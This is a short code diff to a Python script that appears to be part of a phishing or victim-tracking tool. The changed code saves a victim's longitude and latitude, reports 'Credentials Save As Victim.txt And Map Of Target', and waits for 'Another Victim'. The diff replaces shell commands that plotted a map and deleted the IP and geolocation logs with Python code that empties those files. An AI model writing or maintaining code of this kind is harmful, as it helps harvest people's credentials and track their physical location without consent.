@@ -165,9 +165,21 @@ def check_logs():
             f.write("Longitude : %s\n" % (longitude))
             f.write("Latitude : %s\n" % (latitude))
             f.close()
-            os.system('python3 getmap.py %s %s' % (longitude,latitude))
             print("\033[32m[\033[34m+\033[32m] Credentials Save As Victim.txt And Map Of Target...Wait Another Victim...")
-            os.system('rm server/geolocate.txt && rm server/ip.txt')
+            f=open('server/ip.txt','r')
+            content = f.read()
+            f.close()
+            replace_content = content.replace(content,"")
+            f=open('server/ip.txt','w')
+            f.write(replace_content)
+            f.close()
+            f=open('server/geolocate.txt','r')
+            content = f.read()
+            f.close()
+            replace_content = content.replace(content,"")
+            f=open('server/geolocate.txt','w')
+            f.write(replace_content)
+            f.close()
         else:
             pass
 
